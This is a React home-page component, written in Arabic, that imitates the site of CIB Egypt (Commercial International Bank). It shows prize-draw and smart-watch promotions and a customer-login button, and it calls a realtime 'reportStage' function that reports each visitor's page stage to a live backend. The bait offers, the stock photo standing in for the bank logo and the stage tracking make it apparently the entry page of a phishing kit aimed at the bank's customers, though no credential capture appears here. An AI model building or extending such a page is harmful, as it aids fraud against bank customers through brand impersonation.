import { useEffect } from 'react';
import { Link } from 'wouter';
import { AppLayout } from '@/components/layout/AppLayout';
import { useRealtime } from '@/context/RealtimeContext';
import { 
  Shield, 
  Star, 
  Zap, 
  ArrowLeft, 
  Clock, 
  UserCheck, 
  Lock,
  Sparkles
} from 'lucide-react';

// كائنات ثابتة لضمان استقرار الذاكرة ومنع إعادة الإنشاء مع كل صيرورة (Render)
const EMPTY_PAYLOAD = {};

const FEATURES_LIST = [
  { id: 1, text: '100% حماية', icon: Shield },
  { id: 2, text: '+2 مليون عميل', icon: Star },
  { id: 3, text: '24/7 خدمة فورية', icon: Zap },
];

const WHY_US_CARDS = [
  {
    title: 'حماية بنكية متقدمة',
    desc: 'تشفير من الدرجة المصرفية لجميع بياناتك ومعاملاتك على مدار الساعة.',
    icon: Shield,
  },
  {
    title: 'تجربة فائقة السرعة',
    desc: 'تنفيذ معاملاتك في ثوانٍ مع واجهة استخدام سهلة وحديثة.',
    icon: Zap,
  },
  {
    title: 'عروض حصرية',
    desc: 'هدايا وعروض محدودة لعملاء CIB المميزين فقط.',
    icon: Star,
  },
  {
    title: 'دعم 24/7',
    desc: 'فريق دعم متخصص متاح دائماً للإجابة عن استفساراتك.',
    icon: Clock,
  },
];

export default function Home() {
  const { reportStage } = useRealtime();

  useEffect(() => {
    reportStage('home', EMPTY_PAYLOAD);
  }, [reportStage]);

  return (
    <AppLayout>
      <div className="w-full min-h-screen bg-slate-50 flex flex-col items-center justify-start animate-in fade-in duration-500" dir="rtl">
        
        {/* ================= الصورة 1: الهيرو سكشن السفلي المنحني ================= */}
        <div className="w-full bg-gradient-to-b from-[#0b53a7] to-[#073771] text-white pt-10 pb-20 px-4 flex flex-col items-center text-center relative rounded-b-[2.5rem] shadow-md">
          
          {/* شعار البنك الدائري الكبير */}
          <div className="w-28 h-28 bg-white rounded-full flex items-center justify-center p-4 shadow-lg mb-6 border border-blue-200/20">
            <img src="https://images.unsplash.com/photo-1621416894569-0f39ed31d247?auto=format&fit=crop&w=150&q=80" alt="CIB Logo" className="w-full h-auto object-contain" fallback="CIB" />
          </div>

          {/* شارة الترحيب */}
          <div className="inline-flex items-center gap-1.5 bg-white/10 backdrop-blur-sm border border-white/20 px-4 py-1.5 rounded-full text-xs font-medium text-[#ffd166] mb-4">
            <Sparkles className="w-3.5 h-3.5" />
            <span>مرحباً بك في تجربة بنكية جديدة</span>
          </div>

          {/* العناوين */}
          <h1 className="text-3xl md:text-4xl font-extrabold mb-1 tracking-wide">البنك التجاري الدولي</h1>
          <h2 className="text-xl md:text-2xl font-bold text-[#f39c12] mb-4 tracking-normal">CIB Egypt</h2>
          <p className="text-sm text-blue-100 max-w-md mx-auto mb-8 font-light leading-relaxed">
            خدماتك المصرفية بين يديك — أمان، سرعة وثقة في كل معاملة
          </p>

          {/* أزرار التفاعل */}
          <div className="flex flex-col sm:flex-row gap-3.5 w-full max-w-xs sm:max-w-md justify-center">
            <button className="flex items-center justify-center gap-2 bg-transparent border border-white/40 hover:bg-white/10 text-white font-medium py-3 px-6 rounded-xl text-sm transition-all shadow-sm">
              <span>استكشف الخدمات</span>
              <ArrowLeft className="w-4 h-4" />
            </button>
            <button className="flex items-center justify-center gap-2 bg-[#ea8c23] hover:bg-[#d67e1c] text-white font-bold py-3 px-6 rounded-xl text-sm transition-all shadow-md">
              <span>عرض الساعات الذكية</span>
            </button>
          </div>
        </div>

        {/* ================= الصورة 2: قسم المميزات الثلاثية وعناوين الخدمات ================= */}
        <div className="w-full max-w-5xl mx-auto px-4 -mt-8 mb-16 relative z-10">
          {/* شريط المميزات الدائري */}
          <div className="bg-white rounded-3xl p-6 shadow-xl border border-slate-100 grid grid-cols-1 md:grid-cols-3 gap-6 md:divide-x md:divide-x-reverse divide-slate-100">
            {FEATURES_LIST.map((feat) => {
              const IconComp = feat.icon;
              return (
                <div key={feat.id} className="flex flex-col items-center justify-center py-2">
                  <div className="w-12 h-12 bg-blue-50 text-[#0b53a7] rounded-full flex items-center justify-center mb-3">
                    <IconComp className="w-5 h-5" />
                  </div>
                  <span className="text-base font-bold text-slate-800">{feat.text}</span>
                </div>
              );
            })}
          </div>

          {/* هيدر قسم الخدمات */}
          <div className="text-center mt-16 mb-10">
            <div className="inline-flex items-center gap-1 bg-blue-50 text-[#0b53a7] px-3 py-1 rounded-full text-xs font-bold mb-3">
              <Sparkles className="w-3.5 h-3.5" />
              <span>خدماتنا</span>
            </div>
            <h3 className="text-2xl md:text-3xl font-black text-slate-900 mb-2">اختر الخدمة المناسبة لك</h3>
            <p className="text-sm text-slate-500 font-normal">خدمات مصرفية متنوعة مصممة خصيصاً لراحتك</p>
            {/* مؤشرات التبويب (Dots) */}
            <div className="flex justify-center gap-1.5 mt-4">
              <span className="w-6 h-1.5 bg-[#0b53a7] rounded-full"></span>
              <span className="w-2 h-1.5 bg-slate-300 rounded-full"></span>
              <span className="w-2 h-1.5 bg-slate-300 rounded-full"></span>
            </div>
          </div>
        </div>

        {/* ================= الصورة 3: عروض السحب والتمويل ================= */}
        <div className="w-full max-w-xl mx-auto px-4 space-y-8 mb-16">
          
          {/* كارد السحب على سيارة */}
          <div className="bg-white rounded-3xl overflow-hidden shadow-md border border-slate-100 p-5 flex flex-col items-center text-center">
            <div className="w-full relative rounded-2xl overflow-hidden mb-5">
              <span className="absolute top-3 right-3 bg-[#ea8c23] text-white text-[11px] font-bold px-3 py-1 rounded-lg z-10 flex items-center gap-1">
                <Star className="w-3 h-3 fill-white" /> عرض حصري
              </span>
              <img 
                src="https://images.unsplash.com/photo-1617814076367-b759c7d7e738?auto=format&fit=crop&w=600&q=80" 
                alt="Car Promotion" 
                className="w-full h-48 object-cover"
              />
            </div>
            <h4 className="text-xl font-bold text-slate-900 mb-2">سحب على سيارة</h4>
            <p className="text-sm text-slate-500 leading-relaxed mb-6 px-4">
              استخدم بطاقتك الائتمانية من CIB وادخل السحب على سيارة أحلامك! فرصتك للربح بكل عملية شراء.
            </p>
            <button className="flex items-center justify-center gap-2 bg-[#0b53a7] hover:bg-[#073771] text-white font-bold py-3 w-full rounded-2xl text-sm transition-all shadow-sm">
              <span>سجل الآن</span>
              <ArrowLeft className="w-4 h-4" />
            </button>
          </div>

          {/* كارد حلول التمويل السريع */}
          <div className="bg-white rounded-3xl overflow-hidden shadow-md border border-slate-100 p-5 flex flex-col items-center text-center">
            <div className="w-full relative rounded-2xl overflow-hidden mb-4">
              <span className="absolute top-3 right-3 bg-[#ea8c23] text-white text-[11px] font-bold px-3 py-1 rounded-lg z-10 flex items-center gap-1">
                <Zap className="w-3 h-3 fill-white" /> تمويل سريع
              </span>
              <img 
                src="https://images.unsplash.com/photo-1560518883-ce09059eeffa?auto=format&fit=crop&w=600&q=80" 
                alt="Finance Solutions" 
                className="w-full h-48 object-cover"
              />
            </div>
          </div>
        </div>

        {/* ================= الصورة 4: قسم "لماذا تختارنا" ================= */}
        <div className="w-full bg-slate-100/60 py-16 px-4 border-t border-slate-200/50">
          <div className="w-full max-w-3xl mx-auto flex flex-col items-center">
            
            <div className="inline-flex items-center gap-1.5 bg-white text-blue-700 border border-slate-200 px-4 py-1.5 rounded-full text-xs font-bold mb-4 shadow-sm">
              <UserCheck className="w-3.5 h-3.5" />
              <span>لماذا تختارنا</span>
            </div>

            <h3 className="text-2xl md:text-3xl font-black text-slate-900 text-center mb-2">ثقة لا تتزعزع</h3>
            <p className="text-sm text-slate-500 text-center mb-10 font-medium">
              أكثر من <span className="text-blue-700 font-bold">50 عاماً</span> من الخبرة في تقديم أفضل الخدمات المصرفية
            </p>

            {/* شبكة الكروت الرأسية */}
            <div className="w-full space-y-4">
              {WHY_US_CARDS.map((item, index) => {
                const CardIcon = item.icon;
                return (
                  <div key={index} className="bg-white rounded-2xl p-5 shadow-sm border border-slate-100 flex items-start gap-4 text-right">
                    <div className="w-12 h-12 bg-blue-50 text-[#0b53a7] rounded-xl flex items-center justify-center flex-shrink-0">
                      <CardIcon className="w-5 h-5" />
                    </div>
                    <div className="space-y-1">
                      <h5 className="text-sm font-bold text-slate-950">{item.title}</h5>
                      <p className="text-xs text-slate-500 leading-relaxed font-light">{item.desc}</p>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        </div>

        {/* ================= الصورة 5: كارد الحساب الفوري والفوتر ================= */}
        <div className="w-full max-w-3xl mx-auto px-4 pt-12 pb-6">
          
          {/* كارد فتح حساب في ثوانٍ */}
          <div className="bg-gradient-to-br from-[#0c59b3] to-[#06346b] text-white rounded-3xl p-8 text-center shadow-lg relative overflow-hidden mb-16">
            <div className="absolute -top-10 -right-10 w-36 h-36 bg-blue-500/10 rounded-full blur-2xl"></div>
            <h4 className="text-2xl font-black mb-2 leading-snug">جاهز للبدء؟ افتح حسابك في ثوانٍ</h4>
            <p className="text-xs text-blue-100/90 leading-relaxed mb-6 max-w-md mx-auto font-light">
              انضم إلى ملايين العملاء الذين يثقون في CIB لإدارة حياتهم المالية.
            </p>
            <button className="inline-flex items-center justify-center gap-2 bg-white text-slate-900 hover:bg-slate-50 font-bold py-3 px-8 rounded-xl text-xs shadow-md transition-all">
              <UserCheck className="w-4 h-4 text-blue-700" />
              <span>دخول العملاء</span>
            </button>
          </div>

          {/* الفوتر المصغر */}
          <footer className="w-full border-t border-slate-200 pt-6 flex flex-col items-center text-center space-y-2">
            <div className="text-xs font-bold text-[#0b53a7] tracking-wider mb-1">CIB</div>
            <p className="text-[11px] text-slate-400 font-medium">
              © 2026 البنك التجاري الدولي — جميع الحقوق محفوظة
            </p>
            <p className="text-[10px] text-slate-400/80 flex items-center gap-1 justify-center">
              <Lock className="w-3 h-3 text-slate-300" />
              <span>بياناتك محمية بتشفير متوافق تماماً مع المعايير المصرفية الدولية</span>
            </p>
          </footer>
        </div>

      </div>
    </AppLayout>
  );
}
